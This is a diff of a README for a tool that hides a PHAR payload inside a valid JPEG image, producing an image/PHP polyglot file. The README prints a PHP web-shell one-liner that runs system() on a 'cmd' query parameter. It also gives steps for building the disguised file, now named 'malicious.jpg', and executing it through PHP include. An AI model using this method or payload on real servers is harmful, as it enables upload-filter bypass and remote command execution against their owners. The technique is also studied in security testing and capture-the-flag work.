@@ -1,7 +1,5 @@
 # JPEG PHAR Fusion
 
-![Very cool picture](https://github.com/Sarapuce/jpeg-phar-fusion/blob/main/fusion.jpeg)
-
 This is a simple tool to add a phar payload at the end of a valid jpeg image.
 
 ## Requierments
@@ -17,11 +15,13 @@ This is a simple tool to add a phar payload at the end of a valid jpeg image.
 
 `<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>`
 
+Place the php code int the text file called "malicious_php_code.txt"
+
 3. Create the payload with the script
 
-`python3 phar_creator.py '<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>'`
+`python3 phar_creator.py`
 
-4. The file is in `payload.jpg`
+4. The file is in `malicious.jpg`
 
 5. Run "php include.php" to see the code executed!!
 
